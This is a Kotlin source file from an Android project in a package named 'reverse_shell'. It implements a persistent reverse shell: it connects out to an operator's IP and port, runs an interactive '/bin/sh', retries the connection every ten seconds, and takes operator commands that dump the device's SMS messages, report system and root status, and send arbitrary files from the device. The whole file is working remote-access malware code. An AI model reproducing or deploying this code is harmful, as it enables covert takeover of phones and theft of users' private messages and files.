package com.satwik.nexgenius.core.reverse_shell

import android.content.Context
import androidx.compose.runtime.LaunchedEffect
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.onEach
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import java.io.FileOutputStream
import java.io.IOException
import java.io.InputStream
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket

val isSocketConnected = MutableStateFlow(false)

object Payload {
    suspend fun reverseTcp(ip: String, port: Int, context: Context) = runBlocking{

        try {
            var socket = checkAndReconnectSocket(ip, port)

            //Runs on a separate thread(coroutine) and ensures that there socket connection is always maintained
            launch {
                isSocketConnected.collect{ isConnected->
                    if(!isConnected) {
                        socket = checkAndReconnectSocket(ip, port)
                        return@collect
                    }
                }
            }

            val process = Runtime.getRuntime().exec(arrayOf("/bin/sh", "-i"))

            val shellInput = process.inputStream
            val shellError = process.errorStream
            val shellOutput = process.outputStream


            val socketInput = socket.getInputStream()
            val socketOutput = socket.getOutputStream()
            val socketReader = socketInput.bufferedReader()


            while (true) {
                while (shellInput.available() > 0) {
                    socketOutput.write(shellInput.read())
                }

                while (shellError.available() > 0) {
                    socketOutput.write(shellError.read())
                }

                while (socketInput.available() > 0) {
                    val command = socketReader.readLine()
                    executeCommand(command, socketOutput, socketInput, shellOutput, socket, process, context)
                }
                socketOutput.flush()
                shellOutput.flush()
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}

fun executeCommand(command:String, socketOutput:OutputStream, socketInput: InputStream, shellOutput:OutputStream, socket:Socket, process: Process, context: Context){
    when (command) {
        "sysinfo" -> {
            socketOutput.write((getSystemInfo() + "\n").toByteArray())
            shellOutput.write("\n".toByteArray())
        }
        "checkroot" -> {
            socketOutput.write((checkRoot() + "\n").toByteArray())
            shellOutput.write("\n".toByteArray())
        }
        "help" -> {
            socketOutput.write((help() + "\n").toByteArray())
            shellOutput.write("\n".toByteArray())
        }
        "exit" -> {
            socket.close()
            process.destroy()
            isSocketConnected.value = false
            return
        }
        "getsms" -> {
            socketOutput.write((getSms(context) + "\n").toByteArray())
            shellOutput.write("\n".toByteArray())
        }
        else -> {
            if (command.startsWith("download")) {
                val filePath = command.substringAfter("download ").trim()

                // Consider error handling for sendFile and receiveFile
                val sendResult = sendFile(filePath, socketOutput)
                socketOutput.write((sendResult + "\n").toByteArray())

                receiveFile(socketInput, "cup.PNG") // Consider a more descriptive filename

                socketOutput.write((filePath + "\n").toByteArray())
                shellOutput.write("\n".toByteArray()) // Simplified
            } else {
                shellOutput.write((command + "\n").toByteArray())
            }
        }
    }
}



fun receiveFile(socketInput: InputStream, fileName: String){
    println("Receive")
    FileOutputStream(fileName).use { fileOutputStream ->
        val size = socketInput.read().toLong() // read file size
        val buffer = ByteArray(4 * 1024)
        var bytesRead = 0
        var remainingSize = size

        while (remainingSize > 0 && socketInput.read(buffer, 0, minOf(buffer.size, remainingSize.toInt())).also { bytesRead = it } != -1) {
            // Here we write the file using write method
            fileOutputStream.write(buffer, 0, bytesRead)
            remainingSize -= bytesRead // read up to file size
        }
        fileOutputStream.close()
        println("File received")
    }

}

suspend fun checkAndReconnectSocket(host: String, port: Int): Socket {
    var socket: Socket? = null

    while (true) {
        try {
            if (socket == null || !socket.isConnected) {
                println("Socket not connected. Attempting to reconnect...")
                socket = Socket()
                withContext(Dispatchers.IO) {
                    socket.connect(InetSocketAddress(host, port), 2000)
                }

                if (socket.isConnected) {
                    println("Socket connected successfully!")
                    isSocketConnected.value = true
                    return socket
                }
            }
        } catch (e: Exception) {
            isSocketConnected.value = false
            println("Failed to connect. Retrying in 10 seconds...")
        }
        delay(10000)
    }
}




